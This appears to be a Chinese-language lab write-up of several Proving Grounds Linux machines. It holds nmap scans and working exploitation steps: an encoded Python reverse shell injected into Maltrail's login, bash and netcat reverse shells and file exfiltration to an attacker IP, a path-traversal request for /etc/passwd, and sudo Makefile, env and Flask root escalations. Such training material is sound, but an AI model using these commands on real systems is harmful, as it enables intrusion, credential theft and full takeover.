|     Server: Maltrail/0.52
|     Date: Thu, 27 Feb 2025 04:52:34 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8338-TCP:V=7.80%I=7%D=2/27%Time=67BFEF92%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1D5C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20Maltrail/0\.52\r\nD
SF:ate:\x20Thu,\x2027\x20Feb\x202025\x2004:52:34\x20GMT\r\nConnection:\x20
SF:close\r\nContent-Type:\x20text/html\r\nLast-Modified:\x20Sat,\x2031\x20
SF:Dec\x202022\x2022:58:57\x20GMT\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'self';\x20style-src\x20'self'\x20'unsafe-inline';\x20img-src\x20
SF:\*\x20blob:;\x20script-src\x20'self'\x20'unsafe-eval'\x20https://stat\.
SF:ripe\.net;\x20frame-src\x20\*;\x20object-src\x20'none';\x20block-all-mi
SF:xed-content;\r\nCache-Control:\x20no-cache\r\nContent-Length:\x207091\r
SF:\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Compatible
SF:\"\x20content=\"IE=edge\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20ht
SF:tp-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf8\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20user-scalable=no\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20name=\"robots\"\x20content=\"noindex,\x20nofollow\">\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<title>Maltrail</title>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20href=\"c
SF:ss/thirdparty\.min\.css\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20re
SF:l=\"stylesheet\"\x20type=\"text/css\"\x20hre")%r(HTTPOptions,2AE,"HTTP/
SF:1\.0\x20501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nServer:\x20Mal
SF:trail/0\.52\r\nDate:\x20Thu,\x2027\x20Feb\x202025\x2004:52:34\x20GMT\r\
SF:nConnection:\x20close\r\nContent-Type:\x20text/html;charset=utf-8\r\nCo
SF:ntent-Length:\x20500\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DT
SF:D\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\
SF:.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20cont
SF:ent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<titl
SF:e>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<
SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20501</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Message:\x20Unsupported\x20method\x20\('OPTIONS'\
SF:)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanatio
SF:n:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x20Server\x20does\x20not\x20supp
SF:ort\x20this\x20operation\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 - 3.1 (86%), Infomir MAG-250 set-top box (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   2.14 ms 192.168.45.1
2   2.14 ms 192.168.45.254
3   2.85 ms 192.168.251.1
4   2.96 ms 192.168.216.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.00 seconds
```

开放了80和8338端口，8338端口开启了一个Maltrail服务，版本为0.52

![image-20250227131211063](./PG_linux.assets/image-20250227131211063.png)

VPN连接实在收不到shell，换成offsec在线的kali了.....

```
curl http://192.168.55.32:8338/login --data 'username=;`echo+"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNDkuNTUiLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw"+|+base64+-d+|+bash`'
```

拿到shell

![image-20250227201554896](./PG_linux.assets/image-20250227201554896.png)

拿到local

![image-20250227201627379](./PG_linux.assets/image-20250227201627379.png)

这个靶机貌似有严格的防火墙设置，只能80和8338端口出，在用户目录发现`etc_backup.tar`文件，疑似etc下面的备份文件

![image-20250228134028235](./PG_linux.assets/image-20250228134028235.png)

使用nc传输文件

```
kali执行：
nc -lnvp 8338 > etc_backup.tar
靶机执行：
cat etc_backup.tar | nc 192.168.49.56 8338
```

![image-20250228134335642](./PG_linux.assets/image-20250228134335642.png)

下载下来发现了shadow文件

```
root:$y$j9T$VdNCwN5thdnTPXpr87UrZ/$DOfFXgmuYsSQZ5S9GU5faFj8Z/BPpLMD80aEPFmIxt9:19702:0:99999:7:::
```

![image-20250228134413768](./PG_linux.assets/image-20250228134413768.png)

尝试john不支持破解这种格式，通过信息收集发现在/var/backups下面发现了/etc备份脚本，并且会定期root身份运行

![image-20250228135908603](./PG_linux.assets/image-20250228135908603.png)

反弹shell命令写入到etc_Backup.sh脚本中

```
echo "sh -i >& /dev/tcp/192.168.49.56/8338 0>&1" >> etc_Backup.sh
```

监听8338端口稍等一会就会收到root的shell，拿到proof

![image-20250228140126882](./PG_linux.assets/image-20250228140126882.png)

## PyLoader

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.233.26
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-28 20:10 CST
Nmap scan report for 192.168.233.26
Host is up (0.0025s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
9666/tcp open  http    CherryPy wsgiserver
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.233.26:9666/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/28%OT=22%CT=1%CU=42239%PV=Y%DS=4%DC=T%G=Y%TM=67C1A7C
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=F1%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11
OS:NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT     ADDRESS
1   2.03 ms 192.168.45.1
2   2.03 ms 192.168.45.254
3   2.21 ms 192.168.251.1
4   2.63 ms 192.168.233.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.12 seconds
```

开放了9666的http端口

![image-20250228201526739](./PG_linux.assets/image-20250228201526739.png)

检索漏洞

![image-20250228202533327](./PG_linux.assets/image-20250228202533327.png)

利用exp反弹shell

```
python3 51532.py -u http://192.168.233.26:9666/ -c 'busybox nc 192.168.45.184 3000 -e sh'
```

![image-20250228202517039](./PG_linux.assets/image-20250228202517039.png)

拿到proof

![image-20250228202645191](./PG_linux.assets/image-20250228202645191.png)

## Plum

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.233.28
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-28 20:29 CST
Nmap scan report for 192.168.233.28
Host is up (0.0025s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: PluXml - Blog or CMS, XML powered !
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/28%OT=22%CT=1%CU=33606%PV=Y%DS=4%DC=T%G=Y%TM=67C1AC4
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT     ADDRESS
1   1.84 ms 192.168.45.1
2   1.84 ms 192.168.45.254
3   2.40 ms 192.168.251.1
4   2.65 ms 192.168.233.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
```

开放了80的http端口

![image-20250228203203462](./PG_linux.assets/image-20250228203203462.png)

页面下面有管理登录

![image-20250228204539583](./PG_linux.assets/image-20250228204539583.png)

使用admin/admin成功登录系统，确定版本号`PluXml 5.8.7`

![image-20250228204625756](./PG_linux.assets/image-20250228204625756.png)

使用exp：https://github.com/erlaplante/pluxml-rce/blob/main/pluxml.py

成功反弹shell

```
python3 exp.py http://192.168.233.28/ admin admin 192.168.45.184 8000
```

![image-20250228205932327](./PG_linux.assets/image-20250228205932327.png)

拿到local

![image-20250228211626049](./PG_linux.assets/image-20250228211626049.png)

通过linpeas.sh发现mail下面的文件近期被修改过

![image-20250228213356635](./PG_linux.assets/image-20250228213356635.png)

`/var/mail/www-data`找到了root密码

```
root:6s8kaZZNaZZYBMfh2YEW
```

![image-20250228213525384](./PG_linux.assets/image-20250228213525384.png)

拿到proof

![image-20250228214110634](./PG_linux.assets/image-20250228214110634.png)

## SPX

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.233.108
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 09:20 CST
Nmap scan report for 192.168.233.108
Host is up (0.0026s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Tiny File Manager
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   1.84 ms 192.168.45.1
2   1.86 ms 192.168.45.254
3   2.13 ms 192.168.251.1
4   2.38 ms 192.168.233.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.60 seconds
```

开放了80的http端口

![image-20250301092748048](./PG_linux.assets/image-20250301092748048.png)

尝试两个默认口令均失败，扫描后台

```
dirsearch -u http://192.168.233.108/ 
```

![image-20250301095815845](./PG_linux.assets/image-20250301095815845.png)

发现了phpinfo页面，查看发现开启了SPX，版本为0.4.15（题目名字是SPX，不然想不到这里

![image-20250301095850799](./PG_linux.assets/image-20250301095850799.png)

网上找到一个路径遍历漏洞：https://github.com/NoiseByNorthwest/php-spx/issues/251

发包（需要把SPX_KEY参数换成phpinfo显示的：

```
GET /index.php?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 192.168.233.108
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: filemanager=dn7e0ttr0ooqm0fjbnn40pt60b
Upgrade-Insecure-Requests: 1


```

成功读取`/etc/passwd`

![image-20250301101812488](./PG_linux.assets/image-20250301101812488.png)

读取index.php文件的时候发现密码被加密了，复制下来存在文件，使用john解密hash

![image-20250301102312640](./PG_linux.assets/image-20250301102312640.png)

爆出来一个密码，尝试登录admin用户成功（也就爆了58分钟吧......

![image-20250301111153120](./PG_linux.assets/image-20250301111153120.png)

登录后台后上传shell

![image-20250301111119909](./PG_linux.assets/image-20250301111119909.png)

收到www-data的shell

![image-20250301111103617](./PG_linux.assets/image-20250301111103617.png)

常规信息收集没发现能提权的点（linpeas.sh，lse.sh，pspy32s）

但是用user用户的密码成功切换用户为profiler

![image-20250301121508418](./PG_linux.assets/image-20250301121508418.png)

拿到local

![image-20250301121538997](./PG_linux.assets/image-20250301121538997.png)

直接sudo执行`cat /root/proof.txt`失败，`sudo -l`发现用户可以无密码执行`/usr/bin/make install -C /home/profiler/php-spx`

![image-20250301121702735](./PG_linux.assets/image-20250301121702735.png)

make命令以来目录下面的makefile文件，只需要修改makefile文件后编译



```
echo -e "install:\n\t/bin/bash" > /home/profiler/php-spx/Makefile
sudo make install -C /home/profiler/php-spx
```

![image-20250301122606115](./PG_linux.assets/image-20250301122606115.png)

## Jordak

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.233.109
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 18:33 CST
Nmap scan report for 192.168.233.109
Host is up (0.0027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-trane-info: Problem with XML parsing of /evox/about
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/1%OT=22%CT=1%CU=32221%PV=Y%DS=4%DC=T%G=Y%TM=67C2E29E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11
OS:NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   2.37 ms 192.168.45.1
2   2.37 ms 192.168.45.254
3   2.47 ms 192.168.251.1
4   2.74 ms 192.168.233.109

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.06 seconds
```

开放了80的http端口，进去是apache页面

![image-20250301185644668](./PG_linux.assets/image-20250301185644668.png)

通过dirsearch扫描目录发现存在很多目录，并且目录都开启了`Index of`页面

![image-20250301185624498](./PG_linux.assets/image-20250301185624498.png)

没有找到实际有用的信息，但是可以注意到，apache的logo不太一样

![image-20250301185838760](./PG_linux.assets/image-20250301185838760.png)

通过ico搜索找到框架名称：Jorani

![image-20250301190505652](./PG_linux.assets/image-20250301190505652.png)

找到一个exp：https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py

成功RCE

![image-20250301191447700](./PG_linux.assets/image-20250301191447700.png)

先反弹shell

![image-20250301191655418](./PG_linux.assets/image-20250301191655418.png)

拿到local.txt

![image-20250301191941058](./PG_linux.assets/image-20250301191941058.png)

信息收集发现可以无密码执行env命令

![image-20250301192057758](./PG_linux.assets/image-20250301192057758.png)

env提权拿到root的shell

```
sudo env /bin/sh  
```

拿到proof

![image-20250301192337326](./PG_linux.assets/image-20250301192337326.png)

## BitForge

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.233.186
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 19:32 CST
Nmap scan report for 192.168.233.186
Host is up (0.0033s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http        Apache httpd
| http-git: 
|   192.168.233.186:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: created .env to store the database configuration 
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://bitforge.lab/
3306/tcp open   nagios-nsca Nagios NSCA
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.40-0ubuntu0.24.04.1
|   Thread ID: 17
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, Speaks41ProtocolOld, ODBCClient, FoundRows, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, Support41Auth, InteractiveClient, SupportsCompression, SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, LongPassword, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x05RuP
| ^%y((`zmBsANi\x0F%
|_  Auth Plugin Name: caching_sha2_password
9000/tcp closed cslistener
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Infomir MAG-250 set-top box (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%), Linux 3.7 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 9000/tcp)
HOP RTT     ADDRESS
1   2.09 ms 192.168.45.1
2   2.10 ms 192.168.45.254
3   3.18 ms 192.168.251.1
4   3.26 ms 192.168.233.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.81 seconds
```

开放了80的http端口，nmap显示存在.git泄露，利用`githack`工具拿到源码

![image-20250301202414293](./PG_linux.assets/image-20250301202414293.png)

观察index代码可以发现网站有host检测

![image-20250301202851929](./PG_linux.assets/image-20250301202851929.png)

页面登陆点是个假的，既然存在.git泄露，并且开放了3306端口，我尝试在.git文件中尝试翻找



点击这个会跳转到`plan.bitforge.lab`，需要添加入hosts访问（这个看了hints，没想到。。。

![image-20250301213924109](./PG_linux.assets/image-20250301213924109.png)

调转到功能点，经过尝试不是静态的（假的

![image-20250301214143072](./PG_linux.assets/image-20250301214143072.png)

检索漏洞

![image-20250301215312805](./PG_linux.assets/image-20250301215312805.png)

有一个需要认证的rce，弱口令登录失败，想起之前在.git/config收集到了邮箱和名字信息

![image-20250301214223705](./PG_linux.assets/image-20250301214223705.png)

```
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://bitforge.lab/.git/
```

成功下载下来git仓库文件

![image-20250301214452752](./PG_linux.assets/image-20250301214452752.png)

把这些版本一个一个show出来，在`18833b811e967ab8bec631344a6809aa4af59480`找到数据库连接信息

```
+$dbHost = 'localhost'; // Change if your database is hosted elsewhere
+$dbName = 'bitforge_customer_db';
+$username = 'BitForgeAdmin';
+$password = 'B1tForG3S0ftw4r3S0lutions';
```

![image-20250301214713734](./PG_linux.assets/image-20250301214713734.png)

使用mysql连接，需要加上参数`--skip-ssl`，不然会报错

```
mysql -h192.168.233.186 -uBitForgeAdmin -pB1tForG3S0ftw4r3S0lutions --skip-ssl
```

![image-20250301215156689](./PG_linux.assets/image-20250301215156689.png)

根据配置文件， 用户信息的表

![image-20250301215516918](./PG_linux.assets/image-20250301215516918.png)

找到admin的密码信息

![image-20250301215625192](./PG_linux.assets/image-20250301215625192.png)

首先对该hash进行识别，为sha1类型，cmd5没解出来

![image-20250302112720720](./PG_linux.assets/image-20250302112720720.png)

使用mysql直接修改admin的密码为admin进行sha1加密后的值

```
update planning_user set password='d033e22ae348aeb5660fc2140aec35850c4da997' where user_id='ADM' and login='admin';
```

成功修改

![image-20250302113252787](./PG_linux.assets/image-20250302113252787.png)

但是使用admin/admin登录失败了，soplanning是开源的，在github翻找源代码的加密逻辑（这里看了hints

https://github.com/Worteks/soplanning

![image-20250302114000988](./PG_linux.assets/image-20250302114000988.png)

我通过对源代码加密逻辑的分析写出加密代码

```
<?php

function hashPassword($password){
	return sha1("¤" . $password . "¤");
    //return sha1("�" . $password . "�");
}

$a = 'admin';
echo hashPassword($a);
```

![image-20250302121707774](./PG_linux.assets/image-20250302121707774.png)

尝试替换，并不能登录系统

```
update planning_user set password='7008083373fad359533bfd02d6b76c0c2cda11e2' where user_id='ADM' and login='admin';
```

在github仓库文件：includes/demo_data.inc，找到了加盐后的密码

https://github.com/Worteks/soplanning/blob/master/includes/demo_data.inc#L9

![image-20250302121804298](./PG_linux.assets/image-20250302121804298.png)

```
update planning_user set password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' where user_id='ADM' and login='admin';
```

使用admin/admin成功登录系统

![image-20250302124344074](./PG_linux.assets/image-20250302124344074.png)

同时也确定了版本号：`SOPlanning 1.52.01`

用之前找的需要认证的RCE exp成功getshell

```
python3 52082.py -t http://plan.bitforge.lab/www/ -u admin -p admin 
```

![image-20250302124800101](./PG_linux.assets/image-20250302124800101.png)

先反弹shell

使用`lse.sh -l1`命令信息收集找到了jack用户的密码：j4cKF0rg3@445

![image-20250302132012778](./PG_linux.assets/image-20250302132012778.png)

拿到local

![image-20250302132129418](./PG_linux.assets/image-20250302132129418.png)

`sudo -l`发现jack用户可以无密码执行`/usr/bin/flask_password_changer`

![image-20250302132150608](./PG_linux.assets/image-20250302132150608.png)

没见过的命令`-h`的时候发现应该是个py的flask启动脚本

![image-20250302132540728](./PG_linux.assets/image-20250302132540728.png)

ctrl+c让shell断了，但是这时候我们有jack的密码，直接ssh连接就行

![image-20250302132801666](./PG_linux.assets/image-20250302132801666.png)

看一下这个flask

![image-20250302132859060](./PG_linux.assets/image-20250302132859060.png)

将os命令写入文件，sudo执行`flask_password_changer`，成功提权

```
echo 'import os; os.system("/bin/bash")' > /opt/password_change_app/app.py
sudo flask_password_changer
```

![image-20250302133229833](./PG_linux.assets/image-20250302133229833.png)

拿到proof

![image-20250302133404194](./PG_linux.assets/image-20250302133404194.png)

## Vmdak

信息收集：

```
┌──(root㉿cyborg)-[~/tools]
└─# nmap -p- -Pn -A -sS -T4 192.168.119.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 13:35 CST
Nmap scan report for 192.168.119.103
Host is up (0.080s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            1752 Sep 19 15:01 config.xml
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.184
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
9443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title:  Home - Prison Management System
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=vmdak.local/organizationName=PrisonManagement/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:vmdak.local
| Not valid before: 2024-08-20T09:21:33
|_Not valid after:  2025-08-20T09:21:33
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
